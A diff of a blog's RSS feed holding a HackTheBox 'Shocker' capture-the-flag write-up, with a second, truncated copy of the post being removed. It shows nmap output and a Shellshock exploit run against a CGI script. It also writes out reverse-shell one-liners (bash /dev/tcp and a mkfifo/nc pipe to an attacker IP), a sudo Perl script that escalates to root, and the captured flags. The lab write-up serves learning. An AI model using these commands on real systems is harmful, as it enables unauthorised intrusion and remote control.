@@ -7,6 +7,245 @@
 		<atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
 		
 			<item>
+				<title>HackTheBox - Hacking Shocker</title>
+				<description>&lt;h3 id=&quot;disclaimer&quot;&gt;&lt;strong&gt;Disclaimer:&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;As by the ToS of HackTheBox, solutions cannot be posted before the machine is retired, so you won’t be able to use this post as your way into the described machine, since it’ll already be out-of-service.&lt;/p&gt;
+
+&lt;h1 id=&quot;lets-begin&quot;&gt;Let’s begin&lt;/h1&gt;
+&lt;p&gt;Shocker was my second machine, also an easy one (by the ratings), but it was tough to get it. Once I was there, it was straighforward getting the flags. It’s IP was 10.10.10.56.&lt;/p&gt;
+
+&lt;h2 id=&quot;enumerating&quot;&gt;Enumerating&lt;/h2&gt;
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On my machine&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;# Nmap 7.60 scan initiated Sun Feb  4 12:12:55 2018 as: nmap -A -O -sC -sS -T4 -o nmap-shocker.txt 10.10.10.56
+Nmap scan report for 10.10.10.56
+Host is up (0.26s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (EdDSA)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.60%E=4%D=2/4%OT=80%CT=1%CU=37687%PV=Y%DS=2%DC=T%G=Y%TM=5A771517
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)OPS(
+OS:O1=M54DST11NW6%O2=M54DST11NW6%O3=M54DNNT11NW6%O4=M54DST11NW6%O5=M54DST11
+OS:NW6%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
+OS:R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+OS:S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 25/tcp)
+HOP RTT       ADDRESS
+1   273.99 ms 10.10.14.1
+2   272.89 ms 10.10.10.56
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Feb  4 12:13:43 2018 -- 1 IP address (1 host up) scanned in 48.31 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;The machine has HTTP and SSH running. No users, no SSH for the moment. I checked HTTP.&lt;/p&gt;
+
+&lt;h3 id=&quot;http-server&quot;&gt;HTTP server&lt;/h3&gt;
+&lt;p&gt;Accessing http://10.10.10.56 returned the following page.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/shocker/http.png&quot; alt=&quot;img&quot; class=&quot;center-image&quot; /&gt;&lt;em&gt;Page on http://10.10.10.56&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;It meant nothing and the page source code wasn’t interesting. Nevertheless, I still think that the entry point is via web, so I started DirBuster and kept trying to find something.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/shocker/dirbuster1.png&quot; alt=&quot;img&quot; class=&quot;center-image&quot; /&gt;&lt;em&gt;DirBuster parameters&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/shocker/dirbuster2.png&quot; alt=&quot;img&quot; class=&quot;center-image&quot; /&gt;&lt;em&gt;DirBuster results&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Note 1&lt;/strong&gt;: Later I noticed that using &lt;code class=&quot;highlighter-rouge&quot;&gt;DirBuster&lt;/code&gt; without changing the default parameters was a mistake.&lt;/p&gt;
+
+&lt;p&gt;After some time &lt;code class=&quot;highlighter-rouge&quot;&gt;DirBuster&lt;/code&gt; finished running without results. I went back and changed the &lt;strong&gt;wordlist&lt;/strong&gt; used. I selected one that was way larger and the &lt;strong&gt;Time to Finish&lt;/strong&gt; was a few hours. I left it running without hopes and gave up to not checking out the forum. I saw a few answers saying to &lt;strong&gt;think what I was looking for&lt;/strong&gt;. Of course I didn’t know at the time, so I kept reading. Some answers started pointing to some dir in the form &lt;code class=&quot;highlighter-rouge&quot;&gt;xxx-bin&lt;/code&gt;. &lt;br /&gt;
+Ok, I should look for something on &lt;code class=&quot;highlighter-rouge&quot;&gt;cgi-bin&lt;/code&gt;, but what? I knew that &lt;code class=&quot;highlighter-rouge&quot;&gt;cgi-bin&lt;/code&gt; contents used to be &lt;strong&gt;perl scripts&lt;/strong&gt;. I took note and kept reading. Some comments refered to the name of the machine and one asked something like:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;-Should I keep searching for a working shellshock exploit? &lt;br /&gt;
+-Yes&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Now I know that I should search inside &lt;code class=&quot;highlighter-rouge&quot;&gt;cgi-bin&lt;/code&gt; and the machine has something to do with &lt;code class=&quot;highlighter-rouge&quot;&gt;shellshock&lt;/code&gt;. Let’s return to &lt;code class=&quot;highlighter-rouge&quot;&gt;DirBuster&lt;/code&gt;.&lt;br /&gt;
+For the sake of conservativeness, I set &lt;code class=&quot;highlighter-rouge&quot;&gt;sh,pl&lt;/code&gt; on the &lt;em&gt;File extension&lt;/em&gt; field.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/shocker/dirbuster3.png&quot; alt=&quot;img&quot; class=&quot;center-image&quot; /&gt;&lt;em&gt;DirBuster parameters used on the successful run&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/shocker/dirbuster4.png&quot; alt=&quot;img&quot; class=&quot;center-image&quot; /&gt;&lt;em&gt;DirBuster successful results&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Note 2&lt;/strong&gt;: Between the first and successful DirBuster runs, it took about 2 hours.&lt;/p&gt;
+
+&lt;p&gt;I was sure that it was the entry point. I &lt;code class=&quot;highlighter-rouge&quot;&gt;curl&lt;/code&gt;‘ed &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.56/cgi-bin/user.sh&lt;/code&gt; and saw this:&lt;/p&gt;
+
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On my machine&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/ctf/shocker# curl http://10.10.10.56/cgi-bin/user.sh
+Content-Type: text/plain
+
+Just an uptime test script
+
+ 09:45:45 up  1:33,  0 users,  load average: 0.80, 0.59, 0.49&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Let’s find a &lt;code class=&quot;highlighter-rouge&quot;&gt;shellshock&lt;/code&gt; exploit. I asked the internet and it returned &lt;a href=&quot;https://github.com/pwnGuy/shellshock-shell/&quot;&gt;this&lt;/a&gt; particular page.&lt;/p&gt;
+
+&lt;p&gt;So I downloaded it and ran:&lt;/p&gt;
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On my machine&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/ctf/shocker# ./shellshock.py -u http://10.10.10.56/cgi-bin/user.sh
+&amp;gt; id
+uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+&amp;gt; pwd
+/usr/lib/cgi-bin
+&amp;gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Finally!&lt;/p&gt;
+
+&lt;h2 id=&quot;getting-a-decent-shell&quot;&gt;Getting a decent shell&lt;/h2&gt;
+&lt;p&gt;Before going for the flags, I wanted a better shell. And so I got one.&lt;/p&gt;
+
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On my machine&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/ctf/shocker# nc -nlvp 1234
+listening on [any] 1234 ...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On the server&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.15.101/1234 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Then I got a shell!&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/ctf/shocker# nc -nlvp 1234
+listening on [any] 1234 ...
+connect to [10.10.15.101] from (UNKNOWN) [10.10.10.56] 48700
+bash: no job control in this shell
+shelly@Shocker:/usr/lib/cgi-bin$ &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;But ….. this shell was echoing every key typed. I needed a better shell.&lt;/p&gt;
+
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On my machine&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/ctf/shocker# nc -nlvp 1235
+listening on [any] 1235 ...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On the server&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&amp;gt; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc LISTENING-IP LISTENING-PORT &amp;gt; /tmp/f&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On my machine&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/ctf/shocker# nc -nlvp 1235
+listening on [any] 1235 ...
+connect to [10.10.15.101] from (UNKNOWN) [10.10.10.56] 35756
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now the shell was decent. Flags, here I come!&lt;/p&gt;
+
+&lt;h2 id=&quot;getting-the-user-flag-it-was-boring&quot;&gt;Getting the &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; flag (it was boring)&lt;/h2&gt;
+&lt;p&gt;To score the first points, I had to find the &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; file, where the flag was. I took the direct approach:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;shelly@Shocker:/usr/lib/cgi-bin$ cat /home/shelly/user.txt
+2ec24e11320026d1e70ff3e16695b233&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;That was very easy. Let’s step up the game.&lt;/p&gt;
+
+&lt;h2 id=&quot;getting-the-root-flag-it-was-cool&quot;&gt;Getting the &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; flag (it was cool)&lt;/h2&gt;
+&lt;p&gt;As my first try, ran the obvious &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo su&lt;/code&gt; but it didn’t work because the user’s password was unknown.&lt;/p&gt;
+
+&lt;h3 id=&quot;linenum&quot;&gt;LinEnum&lt;/h3&gt;
+&lt;p&gt;So, there is this awesome enumeration script called &lt;code class=&quot;highlighter-rouge&quot;&gt;LinEnum.sh&lt;/code&gt; (that can be found &lt;a href=&quot;https://github.com/rebootuser/LinEnum&quot;&gt;here&lt;/a&gt;). Since the box couldn’t communicate with the outer-world, I had to upload it from my machine and I chose &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; to do that.&lt;/p&gt;
+
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On my machine&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/ctf/shocker# nc -nlvp 1233 &amp;lt; LinEnum.sh 
+listening on [any] 1233 ...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On the server&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;shelly@Shocker:/usr/lib/cgi-bin$ cd /tmp
+shelly@Shocker:/tmp$ nc 10.10.15.101 1233 &amp;gt; enum.sh
+shelly@Shocker:/tmp$ sh enum.sh -t -r shocker&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;The produced report was named &lt;code class=&quot;highlighter-rouge&quot;&gt;shocker-04-02-18&lt;/code&gt; and I downloaded it via &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; (that I’ll suppress).&lt;br /&gt;
+Upon reading it, I saw that &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/perl&lt;/code&gt; could be ran as &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt;. At this point, I noticed that I was very close. I could just write a script to print the &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; flag but that would be pretty boring, right? I’d rather get a &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; shell just for fun! And so I came up with this simple script:&lt;/p&gt;
+
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;root.pl&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;#!/bin/perl
+system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.15.101 1233 &amp;gt;/tmp/f&quot;);&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And proceeded to get the desired shell:&lt;/p&gt;
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On my machine&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/ctf/shocker# nc -nlvp 1233
+listening on [any] 1233 ...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;blockquote class=&quot;filename&quot;&gt;
+  &lt;p&gt;On the server&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;shelly@Shocker:/tmp$ sudo /usr/bin/perl root.pl&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And finally I was (g)&lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt;!&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/ctf/shocker# nc -nlvp 1233
+listening on [any] 1233 ...
+connect to [10.10.15.101] from (UNKNOWN) [10.10.10.56] 40344
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Alright, the &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; flag …&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;# cat /root/root.txt
+52c2715605d70c7619030560dc1ca467&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h1 id=&quot;wrapping-up&quot;&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;It was hard for me to find the entry point, but after that, it was pretty simple. I noticed that sometimes I overcomplicate stuff e.g. I think I could have just set up a perl script with &lt;code class=&quot;highlighter-rouge&quot;&gt;system(&quot;bash&quot;)&lt;/code&gt; and get &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; in the fraction of the time, but I only thought about that hours after. I feel that I lack some enumeration skills and mindset, but that is the purpose of me working on these boxes.&lt;/p&gt;
+
+&lt;p&gt;exit(0);&lt;/p&gt;
+</description>
+				<pubDate>Wed, 21 Feb 2018 16:00:00 -0300</pubDate>
+				<link>/2018/02/htb-ctf-shocker</link>
+				<guid isPermaLink="true">/2018/02/htb-ctf-shocker</guid>
+			</item>
+		
+			<item>
 				<title>HackTheBox - Hacking Mirai</title>
 				<description>&lt;h3 id=&quot;disclaimer&quot;&gt;&lt;strong&gt;Disclaimer:&lt;/strong&gt;&lt;/h3&gt;
 &lt;p&gt;As by the ToS of HackTheBox, solutions cannot be posted before the machine is retired, so you won’t be able to use this post as your way into the described machine, since it’ll already be out-of-service.&lt;/p&gt;
@@ -303,245 +542,6 @@ This post has nothing too exciting, it’s more of a test to check that the gith
 				<pubDate>Fri, 09 Feb 2018 22:00:01 -0200</pubDate>
 				<link>/2018/02/hello-world</link>
 				<guid isPermaLink="true">/2018/02/hello-world</guid>
-			</item>
-		
-			<item>
-				<title>HackTheBox - Hacking Shocker</title>
-				<description>&lt;h3 id=&quot;disclaimer&quot;&gt;&lt;strong&gt;Disclaimer:&lt;/strong&gt;&lt;/h3&gt;
-&lt;p&gt;As by the ToS of HackTheBox, solutions cannot be posted before the machine is retired, so you won’t be able to use this post as your way into the described machine, since it’ll already be out-of-service.&lt;/p&gt;
-
-&lt;h1 id=&quot;lets-begin&quot;&gt;Let’s begin&lt;/h1&gt;
-&lt;p&gt;Shocker was my second machine, also an easy one (by the ratings), but it was tough to get it. Once I was there, it was straighforward getting the flags. It’s IP was 10.10.10.56.&lt;/p&gt;
-
-&lt;h2 id=&quot;enumerating&quot;&gt;Enumerating&lt;/h2&gt;
-&lt;blockquote class=&quot;filename&quot;&gt;
-  &lt;p&gt;On my machine&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;# Nmap 7.60 scan initiated Sun Feb  4 12:12:55 2018 as: nmap -A -O -sC -sS -T4 -o nmap-shocker.txt 10.10.10.56
-Nmap scan report for 10.10.10.56
-Host is up (0.26s latency).
-Not shown: 998 closed ports
-PORT     STATE SERVICE VERSION
-80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-|_http-title: Site doesn't have a title (text/html).
-2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
-|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
-|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (EdDSA)
-No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
-TCP/IP fingerprint:
-OS:SCAN(V=7.60%E=4%D=2/4%OT=80%CT=1%CU=37687%PV=Y%DS=2%DC=T%G=Y%TM=5A771517
-OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)OPS(
-OS:O1=M54DST11NW6%O2=M54DST11NW6%O3=M54DNNT11NW6%O4=M54DST11NW6%O5=M54DST11
-OS:NW6%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
-OS:R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
-OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
-OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
-OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
-OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
-OS:S)
-
-Network Distance: 2 hops
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-TRACEROUTE (using port 25/tcp)
-HOP RTT       ADDRESS
-1   273.99 ms 10.10.14.1
-2   272.89 ms 10.10.10.56
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Sun Feb  4 12:13:43 2018 -- 1 IP address (1 host up) scanned in 48.31 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;The machine has HTTP and SSH running. No users, no SSH for the moment. I checked HTTP.&lt;/p&gt;
-
-&lt;h3 id=&quot;http-server&quot;&gt;HTTP server&lt;/h3&gt;
-&lt;p&gt;Accessing http://10.10.10.56 returned the following page.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/shocker/http.png&quot; alt=&quot;img&quot; class=&quot;center-image&quot; /&gt;&lt;em&gt;Page on http://10.10.10.56&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;It means nothing. Well, I still think that the entry point is via web, so I started DirBuster and kept trying to find something.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/shocker/dirbuster1.png&quot; alt=&quot;img&quot; class=&quot;center-image&quot; /&gt;&lt;em&gt;DirBuster parameters&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/shocker/dirbuster2.png&quot; alt=&quot;img&quot; class=&quot;center-image&quot; /&gt;&lt;em&gt;DirBuster results&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Note 1&lt;/strong&gt;: Later I noticed that using &lt;code class=&quot;highlighter-rouge&quot;&gt;DirBuster&lt;/code&gt; without changing the default parameters was a mistake.&lt;/p&gt;
-
-&lt;p&gt;I went back and changed the &lt;strong&gt;wordlist&lt;/strong&gt; used. I selected one that was way larger and the &lt;strong&gt;Time to Finish&lt;/strong&gt; was a few hours. I left it running without hopes and gave up to not checking out the forum. I saw a few answers saying to &lt;strong&gt;think what I was looking for&lt;/strong&gt;. Of course I didn’t know at the time, so I kept reading. Some answers started pointing to some dir in the form &lt;code class=&quot;highlighter-rouge&quot;&gt;xxx-bin&lt;/code&gt;. &lt;br /&gt;
-Ok, I should look for something on &lt;code class=&quot;highlighter-rouge&quot;&gt;cgi-bin&lt;/code&gt;, but what? I knew that &lt;code class=&quot;highlighter-rouge&quot;&gt;cgi-bin&lt;/code&gt; contents used to be &lt;strong&gt;perl scripts&lt;/strong&gt;. I took note and kept reading. Some comments refered to the name of the machine and one asked something like:&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;-Should I keep searching for a working shellshock exploit? &lt;br /&gt;
--Yes&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Now I know that I should search inside &lt;code class=&quot;highlighter-rouge&quot;&gt;cgi-bin&lt;/code&gt; and the machine has something to do with &lt;code class=&quot;highlighter-rouge&quot;&gt;shellshock&lt;/code&gt;. Let’s return to &lt;code class=&quot;highlighter-rouge&quot;&gt;DirBuster&lt;/code&gt;.&lt;br /&gt;
-For the sake of conservativeness, I set &lt;code class=&quot;highlighter-rouge&quot;&gt;sh,pl&lt;/code&gt; on the *File extension` field.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/shocker/dirbuster3.png&quot; alt=&quot;img&quot; class=&quot;center-image&quot; /&gt;&lt;em&gt;DirBuster parameters used on the successful run&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/shocker/dirbuster4.png&quot; alt=&quot;img&quot; class=&quot;center-image&quot; /&gt;&lt;em&gt;DirBuster successful results&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Note 2&lt;/strong&gt;: Between the first and successful DirBuster runs, it took about 2 hours.&lt;/p&gt;
-
-&lt;p&gt;I was sure that it was the entry point. I &lt;code class=&quot;highlighter-rouge&quot;&gt;curl&lt;/code&gt;‘ed &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.56/cgi-bin/user.sh&lt;/code&gt; and saw this:&lt;/p&gt;
-
-&lt;blockquote class=&quot;filename&quot;&gt;
-  &lt;p&gt;On my machine&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/ctf/shocker# curl http://10.10.10.56/cgi-bin/user.sh
-Content-Type: text/plain
-
-Just an uptime test script
-
- 09:45:45 up  1:33,  0 users,  load average: 0.80, 0.59, 0.49&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Let’s find a &lt;code class=&quot;highlighter-rouge&quot;&gt;shellshock&lt;/code&gt; exploit. I asked the internet and it returned this particular page: TODO FIND THE LINK&lt;/p&gt;
-
-&lt;p&gt;So I downloaded it and ran:&lt;/p&gt;
-&lt;blockquote class=&quot;filename&quot;&gt;
-  &lt;p&gt;On my machine&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/ctf/shocker# ./shellshock.py -u http://10.10.10.56/cgi-bin/user.sh
-&amp;gt; id
-uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
-&amp;gt; pwd
-/usr/lib/cgi-bin
-&amp;gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Finally!&lt;/p&gt;
-
-&lt;h2 id=&quot;getting-a-decent-shell&quot;&gt;Getting a decent shell&lt;/h2&gt;
-&lt;p&gt;Before going for the flags, I wanted a better shell. And so I got one.&lt;/p&gt;
-
-&lt;blockquote class=&quot;filename&quot;&gt;
-  &lt;p&gt;On my machine&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/ctf/shocker# nc -nlvp 1234
